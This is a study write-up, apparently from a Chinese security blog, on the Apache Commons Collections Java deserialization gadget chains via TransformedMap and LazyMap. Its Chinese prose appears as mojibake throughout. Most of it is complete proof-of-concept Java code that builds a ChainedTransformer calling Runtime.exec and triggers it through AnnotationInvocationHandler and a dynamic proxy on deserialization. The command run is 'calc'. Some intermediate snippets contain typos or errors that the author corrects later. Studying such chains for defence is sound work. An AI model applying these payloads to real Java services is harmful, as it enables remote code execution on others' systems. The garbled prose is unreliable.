é‚£ç°åœ¨å†å¦‚ä¸‹æ‰“æ–­ç‚¹ï¼š\nè°ƒè¯•è·Ÿè¿›ï¼Œå‘ç°æœ€ç»ˆå…¶ä½œç”¨çš„ç‚¹å°±æ˜¯getNode()æ–¹æ³•ï¼Œè¿™ä¸ªæ–¹æ³•ä¼šåœ¨å“ˆå¸Œè¡¨ä¸­æŸ¥æ‰¾å¯¹åº”çš„èŠ‚ç‚¹ï¼Œå¦‚æœç›¸åŒ¹é…å°±ä¼šè¿”å›å¯¹åº”çš„èŠ‚ç‚¹ï¼Œæ¯”å¦‚å¦‚æœåŒ¹é…åˆ°æˆ‘è®¾ç½®çš„ceshié”®å’Œå€¼value1ï¼Œé‚£ä¹ˆå°±ä¼šè¿”å›å¯¹åº”èŠ‚ç‚¹ï¼Œå¦åˆ™å°±ä¼šè¿”å›nullã€‚\nåç»­çš„å¦‚ä½•åŒ¹é…å°±æ˜¯æ³¨é‡Šç›¸å…³æŠ€æœ¯äº†ï¼Œåœ¨è¿™é‡Œæƒ³è¦æˆåŠŸé€šè¿‡çš„æ¡ä»¶ä¸ºï¼š\nsun.reflect.annotation.AnnotationInvocationHandleræ„é€ å‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°å¿…é¡»æ˜¯Annotationçš„å­ç±»ï¼Œä¸”å…¶ä¸­å¿…é¡»å«æœ‰è‡³å°‘ä¸€ä¸ªæ–¹æ³•ï¼Œå‡è®¾æ–¹æ³•åæ˜¯X é‚£ä¹ˆè¢«TransformedMap.decorateä¿®é¥°çš„Mapä¸­å¿…é¡»æœ‰ä¸€ä¸ªé”®åä¸ºXçš„å…ƒç´  æ‰€ä»¥åœ¨è¿™é‡Œæˆ‘ä»¬éœ€è¦å°†é”®è®¾ç½®ä¸ºvalueï¼Œå› ä¸ºæ³¨è§£ç±»æœ‰åä¸ºvalueçš„æ–¹æ³•ï¼š æ‰€ä»¥æœ€ç»ˆçš„å¯åˆ©ç”¨çš„POCï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 package org.example; import org.apache.commons.collections.map.TransformedMap; import java.lang.Runtime; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.Transformer; import java.util.HashMap; import java.util.Map; import java.lang.reflect.Constructor; import java.lang.annotation.Retention; import java.lang.Class; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.io.FileOutputStream; import java.io.FileInputStream; public class Test { public static void main(String[] args) throws Exception { ChainedTransformer chain = new ChainedTransformer(new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026#34;getMethod\u0026#34;,new Class[]{String.class,Class[].class},new Object[]{\u0026#34;getRuntime\u0026#34;,null}), new InvokerTransformer(\u0026#34;invoke\u0026#34;,new Class[]{Object.class,Object[].class},new Object[]{null,null}), new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;calc\u0026#34;}) }); HashMap hashMap = new HashMap(); hashMap.put(\u0026#34;value\u0026#34;,\u0026#34;xxx\u0026#34;); Map map2 = TransformedMap.decorate(hashMap,null,chain); Class clazz = Class.forName(\u0026#34;sun.reflect.annotation.AnnotationInvocationHandler\u0026#34;); Constructor constructor1 = clazz.getDeclaredConstructor(Class.class,Map.class); constructor1.setAccessible(true); Object o = constructor1.newInstance(Retention.class,map2); //åºåˆ—åŒ– serialize(o); //ååºåˆ—åŒ– unserialize(); } public static void serialize(Object o) throws Exception { ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); out.writeObject(o); out.close(); } public static void unserialize() throws Exception { ObjectInputStream o = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); o.readObject(); o.close(); } } æˆå¼¹å‡ºä¸€ä¸ªè®¡ç®—æœºã€‚\nç°åœ¨æ¥çœ‹ä¸€ä¸‹setValue()æ–¹æ³•åç»­è°ƒç”¨çš„æ–¹æ³•çš„æºç ï¼š\nç„¶åå°±æ˜¯TransformedMapç±»çš„checkSetValue()æ–¹æ³•ï¼š ç”±äºæˆ‘ä»¬å‰é¢å°±å°†valueTransformerè®¾ç½®ä¸ºäº†chainé“¾ï¼Œæ‰€ä»¥åç»­éƒ½ä¼šå¾€é¢„ä¼°æ–¹å‘å‘å±•ï¼Œå…·ä½“è¿‡ç¨‹å¯ä»¥å‚è€ƒå‰é¢çš„åŸºç¡€ä»£ç éƒ¨åˆ†ã€‚\nâ€”â€”â€”â€”â€”â€”â€”â€”â€”â€”\nç„¶åæ€»ç»“ä¸€ä¸‹å‰é¢çš„é—®é¢˜ï¼š\nè¿˜æ˜¯è¦æ³¨æ„ä¸€ä¸‹Runtimeç±»ä¸èƒ½å®ä¾‹åŒ–çš„é—®é¢˜ åå°„è·å–AnnotationInvocationHandlerç±» è¿›å…¥forå¾ªç¯çš„éœ€è¦puté”®å€¼å¯¹çš„é—®é¢˜ ifæ¡ä»¶çš„è¿›å…¥æ¡ä»¶ åœ¨æ‹‰é€šæ•´ä¸ªè¿‡ç¨‹æ—¶çš„è°ƒè¯•è¿‡ç¨‹ä¸­é‡åˆ°çš„é—®é¢˜ï¼š\næš‚æ—¶å¯¹äºå¾ˆå¤šéƒ½æ˜¯åˆæ­¥äº†è§£å§ï¼Œè·Ÿæºç å…¶å®è¿˜æœ‰ç‚¹çœ‹ä¸æ‡‚ï¼Œåé¢å†æ¥çœ‹çœ‹ï¼Œç®€å•ç»™å‡ºç¤ºä¾‹ä»£ç ï¼Œä¹Ÿè®¸å¯ä»¥åœ¨è°ƒè¯•è¿‡ç¨‹ä¸­æ›´å®¹æ˜“ç†è§£ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 package org.example; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.TransformedMap; import java.util.HashMap; import java.util.Map; public class Main { public static void main(String[] args) throws Exception { Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.getRuntime()), new InvokerTransformer(\u0026#34;exec\u0026#34;, new Class[]{String.class}, new Object[]{\u0026#34;calc\u0026#34;}), }; Transformer transformerChain = new ChainedTransformer(transformers); Map\u0026lt;String, String\u0026gt; innerMap = new HashMap\u0026lt;\u0026gt;(); innerMap.put(\u0026#34;value\u0026#34;, \u0026#34;xxx\u0026#34;); Map\u0026lt;String, String\u0026gt; outerMap = TransformedMap.decorate(innerMap, null, transformerChain); try { for (Map.Entry\u0026lt;String, String\u0026gt; entry : outerMap.entrySet()) { System.out.println(\u0026#34;æˆåŠŸè¿›å…¥å¾ªç¯éå†\u0026#34;); System.out.println(entry); System.out.println(\u0026#34;key: \u0026#34; + entry.getKey() + \u0026#34; value: \u0026#34; + entry.getValue()); } } catch (Exception e) { e.printStackTrace(); } } } æ‰“æ–­ç‚¹å¦‚ä¸‹ï¼š\nçœ‹æ­¤æ—¶çš„å€¼ï¼š ç„¶åå†çœ‹ä¸Šé¢çš„å®ä¾‹ä»£ç ç»™å‡ºçš„ç»“æœï¼š\næš‚æ—¶å°±é€šè¿‡å®ä¾‹æ¥ç¨å¾®ç†è§£ä¸€ä¸‹ï¼Œçœ‹è¿™ä¸ªentryçš„å€¼ï¼Œå‰é¢æ‰€å±å°±æ˜¯AbstractInputCheckedMapDecorator$MapEntryï¼ˆä¸»è¦å°±æ˜¯è¿™é‡Œæ‰€å±ä¸ºä»€ä¹ˆæ˜¯è¿™ä¸ªè¿˜æœ‰ç‚¹ä¸æ¸…æ¥šï¼‰ï¼Œè¿™æ ·ä¹Ÿå°±èƒ½å¤Ÿè¯´æ˜ä¸ºä»€ä¹ˆreadObject()æ–¹æ³•ä¸­åœ¨è°ƒç”¨setValue()æ–¹æ³•æ—¶ä¼šåˆ°è¿™ä¸ªMapEntryç±»ï¼ˆå°±ç®—ç›´æ¥åœ¨readObjectæ–¹æ³•æ‰“æ–­ç‚¹æ‰€å±è¿˜æ˜¯è¿™ä¸ªï¼‰ï¼Œä»è€Œå¯¼è‡´æ•´æ¡é“¾å­çš„æ‰§è¡Œã€‚\nLazyMapé“¾ å®é™…ä¸Šï¼Œåœ¨ysoserialé“¾ä¸­ï¼Œå®ƒåˆ©ç”¨çš„å¹¶ä¸æ˜¯TransformedMapï¼Œè€Œæ˜¯åˆ©ç”¨çš„LazyMapã€‚\nåˆ†æåŠæ„é€ è¿‡ç¨‹ LazyMapçš„æ¼æ´è§¦å‘ç‚¹æ˜¯å®ƒçš„get()æ–¹æ³•getæ–¹æ³•ï¼Œä¹Ÿå°±æ˜¯getæ–¹æ³•æºç ä¸­çš„factory.transform()ã€‚ä¹Ÿå°±æ˜¯LazyMapçš„ä½œç”¨æ˜¯â€œæ‡’åŠ è½½â€ï¼Œåœ¨getæ‰¾ä¸åˆ°å€¼çš„æ—¶å€™ï¼Œå®ƒä¼šè°ƒç”¨factory.transformæ–¹æ³•å»è·å–ä¸€ä¸ªå€¼ï¼š\n1 2 3 4 5 6 7 8 9 10 public Object get(Object key) { if (!this.map.containsKey(key)) { //å®¡ä»£ç å¦‚æœä¼ å…¥çš„keyä¸å­˜åœ¨ï¼Œå°±ä¼šæ‰ä¼šè¿›å…¥è¿™ä¸ªifæ¡ä»¶ Object value = this.factory.transform(key); this.map.put(key, value); return value; } else { return this.map.get(key); } } ç›¸è¾ƒäºTransformedMapé“¾çš„åˆ©ç”¨æ–¹æ³•ï¼ŒLazyMapçš„åˆ©ç”¨æ›´å¤æ‚ä¸€äº›ï¼Œç”±äºsun.reflect.annotation.AnnotationInvocationHandlerçš„readObjectæ–¹æ³•ä¸­æ²¡æœ‰è°ƒç”¨åˆ°Mapçš„getæ–¹æ³•ã€‚ä½†æ˜¯AnnotationInvocationHandlerç±»çš„invokeæ–¹æ³•æœ‰è°ƒç”¨åˆ°getæ–¹æ³•ï¼Œæºç å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 public Object invoke(Object proxy, Method method, Object[] args) { String member = method.getName(); Class\u0026lt;?\u0026gt;[] paramTypes = method.getParameterTypes(); // Handle Object and Annotation methods if (member.equals(\u0026#34;equals\u0026#34;) \u0026amp;\u0026amp; paramTypes.length == 1 \u0026amp;\u0026amp; paramTypes[0] == Object.class) return equalsImpl(args[0]); if (paramTypes.length != 0) throw new AssertionError(\u0026#34;Too many parameters for an annotation method\u0026#34;); switch(member) { case \u0026#34;toString\u0026#34;: return toStringImpl(); case \u0026#34;hashCode\u0026#34;: return hashCodeImpl(); case \u0026#34;annotationType\u0026#34;: return type; } // Handle annotation member accessors Object result = memberValues.get(member); if (result == null) throw new IncompleteAnnotationException(type, member); if (result instanceof ExceptionProxy) throw ((ExceptionProxy) result).generateException(); if (result.getClass().isArray() \u0026amp;\u0026amp; Array.getLength(result) != 0) result = cloneArray(result); return result; } é‚£ä¹ˆå¦‚ä½•è°ƒç”¨åˆ°AnnotationInvocationHandler#invokeå‘¢ï¼Ÿè¿™é‡Œå°±å¯ä»¥åˆ©ç”¨åˆ°åŠ¨æ€ä»£ç†ã€‚\nç°åœ¨å…ˆå›åˆ°LazyMapçš„get()æ–¹æ³•æºç ï¼Œé‡ç‚¹åˆ†æä¸€ä¸‹ifè¯­å¥ï¼š\n1 2 3 4 5 6 7 public Object get(Object key) { if (!this.map.containsKey(key)) { //å®¡ä»£ç å¦‚æœä¼ å…¥çš„keyä¸å­˜åœ¨ï¼Œå°±ä¼šæ‰ä¼šè¿›å…¥è¿™ä¸ªifæ¡ä»¶ Object value = this.factory.transform(key); this.map.put(key, value); return value; } æ¥çœ‹è¿›å…¥ifè¯­å¥çš„æ¡ä»¶ï¼Œthis.map.containsKey(key)å°±æ˜¯çœ‹é”®å€¼è¡¨ä¸­æ˜¯å¦æœ‰è¿™ä¸ªkeyï¼Œåœ¨è¿™é‡Œéœ€è¦æ²¡æœ‰è¿™ä¸ªkeyæ‰èƒ½è¿›å…¥ifæ¡ä»¶ï¼›é‚£ä¹ˆè¿™ä¸ªkeyå¯¹åº”çš„invokeä¸­çš„ä»£ç å°±æ˜¯String member = method.getName(); å­¦è¿‡åŠ¨æ€ä»£ç†çš„è¯å°±çŸ¥é“è¿™é‡Œçš„memberå¯¹åº”çš„å°±æ˜¯ä»£ç†å¯¹è±¡è°ƒç”¨çš„æ–¹æ³•åï¼Œä¸€èˆ¬åœ¨ä¸€ä¸ªjavaå¯¹è±¡ä¸­éƒ½ä¸ä¼šæœ‰ä¸€ä¸ªä»¥æ–¹æ³•åä¸ºé”®çš„é”®å€¼å¯¹ï¼Œæ‰€ä»¥ä¸€èˆ¬è¿™é‡Œçš„ifæ¡ä»¶å…¶å®æ˜¯å¯ä»¥å¿½ç•¥çš„ã€‚ç„¶åæˆ‘æƒ³äº†ä¸€ä¸‹ï¼Œå¦‚æœæˆ‘è®¤ä¸ºè®¾ç½®ä¸€ä¸ªé”®å€¼å¯¹çš„é”®å°±æ˜¯ä»£ç†å¯¹è±¡è¦è°ƒç”¨çš„æ–¹æ³•åç§°ï¼Œé‚£ä¹ˆæ˜¯å¦åº”è¯¥ä¸ä¼šç»§ç»­ä¸‹å»ã€‚ç†è®ºä¸Šæ˜¯ä¸ªäººæ„Ÿè§‰æ˜¯å¯ä»¥çš„ï¼Œåé¢å®è·µä¸€ä¸‹ã€‚\nâ€”â€”\nç°åœ¨ç»§ç»­é“¾å­çš„è¯´æ˜\nå‰é¢è¯´åˆ°äº†éœ€è¦ç”¨åŠ¨æ€ä»£ç†ï¼Œæ‰€ä»¥è¿™é‡Œéœ€è¦ç”¨åˆ°java.lang.reflect.Proxyä»¥åŠInvocationHandleræ¥å£\nåœ¨è¿™é‡ŒAnnotationInvocationHandlerå®ç°äº†InvocationHandleræ¥å£å¹¶é‡å†™äº†invokeæ–¹æ³•ï¼Œç¬¦åˆåŸºæœ¬æ¡ä»¶ã€‚\nçœ‹ä»£ç æ‰€éœ€çš„å¯¹è±¡ï¼Œè¿™é‡Œå°±çœ‹çœ‹åœ¨å“ªäº›åœ°æ–¹éœ€è¦æ³¨æ„ï¼š é¦–å…ˆå°±æ˜¯AnnotationInvocationHandler#invokeä¸­è°ƒç”¨get()çš„åœ°æ–¹ï¼ŒmemberValues.get(member);ï¼Œæ‰€ä»¥è¿™é‡Œçš„membervalueséœ€è¦ä¸ºLazyMapç±»å¯¹è±¡ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å¦‚ä¸‹æ„é€ ï¼š\n1 2 3 4 Class clazz = Class.forName(\u0026#34;sun.reflect.annotation.AnnotationInvocationHandler\u0026#34;); Constructor constructor1 = clazz.getDeclaredConstroctor(Class.class,Map.class); constroctor1.setAccessible(true); object o = constructor1.newInstance(Retention.class,outerMap); ç°åœ¨å†æ¥çœ‹ä¸€ä¸‹outerMapçš„å†…å®¹ï¼Œç°åœ¨é¦–å…ˆå°±éœ€è¦çœ‹ä¸€ä¸‹LazyMapçš„æ„é€ æ–¹æ³•ç­‰ï¼Œç¨å¾®çœ‹ä¸€ä¸‹æºç ï¼Œå¯ä»¥çŸ¥æ™“æˆ‘ä»¬åˆ©ç”¨åˆ°çš„ä»£ç ä¸ºï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 public static Map decorate(Map map, Transformer factory) { return new LazyMap(map, factory); } protected LazyMap(Map map, Transformer factory) { super(map); if (factory == null) { throw new IllegalArgumentException(\u0026#34;Factory must not be null\u0026#34;); } else { this.factory = factory; } } æ‰€ä»¥æˆ‘ä»¬å¯ä»¥å¦‚ä¸‹æ„é€ ï¼š\n1 2 3 4 Transformer chain = new ChainedTransformer(new Transformer[]{new ConstantTransformer(Runtime.class),new InvokerTransformer(\u0026#34;getMethod\u0026#34;,new Class[]{String.class,Class[].class},new Object[]{\u0026#34;getRuntime\u0026#34;,null}),new InvokerTransformer(\u0026#34;invoke\u0026#34;,new Class[]{Object.class,Object[].class},new Object[]{Runtime.class,null}),new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;calc\u0026#34;})}); Map hashMap = new HashMap(); Transformer outerMap = LazyMap.decorate(hashMap,chain); å†å°†å‰é¢ç»¼åˆä¸€ä¸‹ï¼Œå°±æ˜¯å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 package org.example; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import java.lang.annotation.Retention; import org.apache.commons.collections.map.LazyMap; import java.util.HashMap; import java.util.Map; import java.lang.reflect.Constructor; public class Main{ public static void main(String[] args) throws Exception { Transformer chain = new ChainedTransformer(new Transformer[]{new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026#34;getMethod\u0026#34;,new Class[]{String.class,Class[].class},new Object[]{\u0026#34;getRuntime\u0026#34;,null}), new InvokerTransformer(\u0026#34;invoke\u0026#34;,new Class[]{Object.class,Object[].class},new Object[]{Runtime.class,null}), new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;calc\u0026#34;})}); Map hashMap = new HashMap(); Map outerMap = LazyMap.decorate(hashMap,chain); Class clazz = Class.forName(\u0026#34;sun.reflect.annotation.AnnotationInvocationHandler\u0026#34;); Constructor constructor1 = clazz.getDeclaredConstructor(Class.class,Map.class); constructor1.setAccessible(true); Object o = constructor1.newInstance(Retention.class,outerMap); } } æœ€åŸºæœ¬çš„é“¾å­å¤§æ¦‚å¦‚ä¸Šï¼Œç°åœ¨å°±æ˜¯æ€è€ƒå¦‚ä½•è·³åˆ°LazyMapçš„getæ–¹æ³•ï¼Œç»“åˆå‰é¢çš„è¯´æ³•ï¼Œç°åœ¨å°±æ˜¯è¦æ€è€ƒå¦‚ä½•è®¾ç½®ä»£ç†å¯¹è±¡ï¼Œç»“åˆåŠ¨æ€ä»£ç†çš„æµç¨‹ï¼Œåœ¨è¿™é‡Œæˆ‘ä»¬å°†Mapæ¥å£ç±»ä½œä¸ºâ€œä¸­é—´â€ç±»ï¼Œåˆšå¥½â€œå§”æ‰˜ç±»â€LazyMapæ˜¯å®ç°äº†Mapæ¥å£çš„ï¼Œæ‰€ä»¥æ˜¯å¾ˆåˆé€‚çš„ã€‚\nç„¶åç†è§£ä¸€ä¸‹ysoserialé“¾ï¼Œå¯ä»¥çŸ¥æ™“åœ¨éå†Map(proxy)æ—¶ä¼šè°ƒç”¨memberValues.entrySetæ–¹æ³•ï¼Œè¿›è€Œå¯ä»¥è§¦å‘invokeæ–¹æ³•ã€‚\nä¸€æ­¥ä¸€æ­¥æ¥ï¼Œæ‰€ä»¥é¦–å…ˆæˆ‘ä»¬è¿™é‡Œæ„é€ handlerï¼Œ\n1 InvocationHandler handler = (InvocationHandler)constructor1.newInstance(Retention.class,outerMap); ç„¶åè°ƒç”¨Proxyçš„newProxyInstance()æ–¹æ³•ï¼Œç”¨æ¥åˆ›å»ºä¸€ä¸ªä»£ç†å¯¹è±¡ï¼Œå¦‚ä¸‹ï¼š\n1 2 3 //ysoerialé“¾è¿™é‡Œå…¶å®åˆ©ç”¨çš„æ˜¯Map.classçš„æ„é€ å™¨ç­‰ï¼Œä½†æ˜¯å…¶å®åœ¨æœ€åçš„åˆ©ç”¨ä¸­å·®åˆ«ä¸å¤§ï¼Œå…ˆè·Ÿè¿™ä¸ª Class[] interfaces = Map.class.getInterfaces(); Map proxyMap = (Map)Proxy.newProxyInstance(Map.class.getClassLoader(),interfaces,outerMap); è¿™æ ·å°±æˆåŠŸåˆ›å»ºäº†ä¸€ä¸ªä»£ç†å¯¹è±¡ï¼Œè¿™æ˜¯å†çœ‹ysoserialï¼Œç²¾å¦™çš„åœ°æ–¹æ¥äº†ï¼Œå¦‚ä¸‹ä»£ç ï¼š\n1 Object o = constructor1.newInstance(Retention.class,proxyMap); ç„¶åå†å°†è¿™ä¸ªoåºåˆ—åŒ–å¹¶ååºåˆ—åŒ–ï¼Œå½“ååºåˆ—åŒ–çš„æ—¶å€™ï¼Œä¼šå¯¹proxyMapè°ƒç”¨entryMap()æ–¹æ³•ï¼Œæ­¤æ—¶å°±ä¼šåˆ°AnnotationInvocationHandlerçš„invokeæ–¹æ³•ï¼Œç„¶åä¸€åˆ‡éƒ½ä¼šå¾€é¢„æœŸçš„æ–¹å‘å‘å±•ã€‚å†å°†å‰é¢æ‰€æœ‰çš„ä»£ç ç»“åˆèµ·æ¥ç¨å¾®æ”¹æ”¹ï¼Œå°±æ˜¯å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 package org.example; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import java.lang.annotation.Retention; import org.apache.commons.collections.map.LazyMap; import java.util.HashMap; import java.util.Map; import java.lang.reflect.Constructor; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.io.FileInputStream; import java.io.FileOutputStream; import java.lang.reflect.Proxy; import java.lang.reflect.InvocationHandler; public class Main{ public static void main(String[] args) throws Exception { Transformer chain = new ChainedTransformer(new Transformer[]{new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026#34;getMethod\u0026#34;,new Class[]{String.class,Class[].class},new Object[]{\u0026#34;getRuntime\u0026#34;,null}), new InvokerTransformer(\u0026#34;invoke\u0026#34;,new Class[]{Object.class,Object[].class},new Object[]{Runtime.class,null}), new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;calc\u0026#34;})}); Map hashMap = new HashMap(); Map outerMap = LazyMap.decorate(hashMap,chain); Class clazz = Class.forName(\u0026#34;sun.reflect.annotation.AnnotationInvocationHandler\u0026#34;); Constructor constructor1 = clazz.getDeclaredConstructor(Class.class,Map.class); constructor1.setAccessible(true); InvocationHandler handler = (InvocationHandler)constructor1.newInstance(Retention.class,outerMap); Class[] interfaces = Map.class.getInterfaces(); Map proxyMap = (Map)Proxy.newProxyInstance(Map.class.getClassLoader(),interfaces,handler); Object o = constructor1.newInstance(Retention.class,proxyMap); //åºåˆ—åŒ– ObjectOutputStream x = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); x.writeObject(o); x.close(); //ååºåˆ—åŒ– ObjectInputStream ctf = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); ctf.readObject(); ctf.close(); } } æŠ¥é”™\nè¿™æ˜¯å› ä¸ºåœ¨è®¾ç½®ä»£ç†å¯¹è±¡æ—¶çš„ç¬¬äºŒä¸ªå‚æ•°Map.class.getInterfaces()çš„Map.classå¹¶æ²¡æœ‰å®ç°Mapæ¥å£ï¼ŒåŠ¨æ€ä»£ç†æ²¡æŒæ¡å¥½ï¼Œç…§çŒ«ç”»è™äº†å±äºæ˜¯ï¼Œæ‰€ä»¥è¿™é‡Œå®Œå…¨æ˜¯å¤šæ­¤ä¸€ä¸¾äº†ï¼Œæˆ‘ä»¬å°±å¯ä»¥ç›´æ¥ä½¿ç”¨Map.classå³å¯ï¼Œè€Œä¸”æœ¬èº«Mapå°±æ˜¯ä¸€ä¸ªæ¥å£ç±»ã€‚\næ‰€ä»¥æœ€ç»ˆçš„POCä¸ºï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 package org.example; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import java.lang.annotation.Retention; import org.apache.commons.collections.map.LazyMap; import java.util.HashMap; import java.util.Map; import java.lang.reflect.Constructor; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.io.FileInputStream; import java.io.FileOutputStream; import java.lang.reflect.Proxy; import java.lang.reflect.InvocationHandler; public class Main{ public static void main(String[] args) throws Exception { Transformer chain = new ChainedTransformer(new Transformer[]{new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026#34;getMethod\u0026#34;,new Class[]{String.class,Class[].class},new Object[]{\u0026#34;getRuntime\u0026#34;,null}), new InvokerTransformer(\u0026#34;invoke\u0026#34;,new Class[]{Object.class,Object[].class},new Object[]{Runtime.class,null}), new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;calc\u0026#34;})}); Map hashMap = new HashMap(); Map outerMap = LazyMap.decorate(hashMap,chain); Class clazz = Class.forName(\u0026#34;sun.reflect.annotation.AnnotationInvocationHandler\u0026#34;); Constructor constructor1 = clazz.getDeclaredConstructor(Class.class,Map.class); constructor1.setAccessible(true); InvocationHandler handler = (InvocationHandler)constructor1.newInstance(Retention.class,outerMap); Map proxyMap = (Map)Proxy.newProxyInstance(Map.class.getClassLoader(),new Class[]{Map.class},handler); Object o = constructor1.newInstance(Retention.class,proxyMap); //åºåˆ—åŒ– ObjectOutputStream x = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); x.writeObject(o); x.close(); //ååºåˆ—åŒ– ObjectInputStream ctf = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); ctf.readObject(); ctf.close(); } } æˆåŠŸå¼¹å‡ºè®¡ç®—æœºï¼š\nâ€”â€”â€”â€”â€”â€”\næ€è€ƒ OKï¼Œç°åœ¨å°±æ˜¯è§£å†³å‰é¢é—ç•™çš„é—®é¢˜ã€‚\n1.è®¾ç½®ä¸€ä¸ªæ–¹æ³•åç§°å¯¹åº”çš„é”®çš„å®è·µï¼Œä¹Ÿå°±æ˜¯åŠ ä¸€ä¸ªhashMap.put(\u0026quot;entrySet\u0026quot;,\u0026quot;xxxx\u0026quot;); ã€‚æœ€åçš„æµ‹è¯•ä»£ç å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 package org.example; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import java.lang.annotation.Retention; import org.apache.commons.collections.map.LazyMap; import java.util.HashMap; import java.util.Map; import java.lang.reflect.Constructor; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.io.FileInputStream; import java.io.FileOutputStream; import java.lang.reflect.Proxy; import java.lang.reflect.InvocationHandler; public class Main{ public static void main(String[] args) throws Exception { Transformer chain = new ChainedTransformer(new Transformer[]{new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026#34;getMethod\u0026#34;,new Class[]{String.class,Class[].class},new Object[]{\u0026#34;getRuntime\u0026#34;,null}), new InvokerTransformer(\u0026#34;invoke\u0026#34;,new Class[]{Object.class,Object[].class},new Object[]{Runtime.class,null}), new InvokerTransformer(\u0026#34;exec\u0026#34;,new Class[]{String.class},new Object[]{\u0026#34;calc\u0026#34;})}); Map hashMap = new HashMap(); hashMap.put(\u0026#34;entrySet\u0026#34;,\u0026#34;xxxx\u0026#34;);//here!!!! Map outerMap = LazyMap.decorate(hashMap,chain); Class clazz = Class.forName(\u0026#34;sun.reflect.annotation.AnnotationInvocationHandler\u0026#34;); Constructor constructor1 = clazz.getDeclaredConstructor(Class.class,Map.class); constructor1.setAccessible(true); InvocationHandler handler = (InvocationHandler)constructor1.newInstance(Retention.class,outerMap); Map proxyMap = (Map)Proxy.newProxyInstance(Map.class.getClassLoader(),new Class[]{Map.class},handler); Object o = constructor1.newInstance(Retention.class,proxyMap); //åºåˆ—åŒ– ObjectOutputStream x = new ObjectOutputStream(new FileOutputStream(\u0026#34;ser.ser\u0026#34;)); x.writeObject(o); x.close(); //ååºåˆ—åŒ– ObjectInputStream ctf = new ObjectInputStream(new FileInputStream(\u0026#34;ser.ser\u0026#34;)); ctf.readObject(); ctf.close(); } } æœ€ç»ˆå¹¶æ²¡æœ‰å¼¹å‡ºè®¡ç®—æœºï¼Œæƒ³æ³•æ­£ç¡®ã€‚\n2,.åˆ›å»ºä»£ç†å¯¹è±¡æ—¶çš„æ–¹æ³•å‚æ•°é—®é¢˜ï¼Œåœ¨æˆ‘ä»¬æƒ³è¦åˆ©ç”¨çš„LazyMapé“¾ä¸­ï¼Œå…¶å®åªè¦åˆ°äº†AnnotationInvocationHandler#invokeä¸­ï¼Œæ­£ç¡®è°ƒç”¨äº†getæ–¹æ³•ï¼Œé‚£ä¹ˆå¯¹äºåç»­çš„å¦‚æ­£å¸¸ä»£ç†ä¸­çš„ä¼šå»åˆ°å§”æ‰˜ç±»ä¸€ä¸‹éƒ½æ˜¯æ— 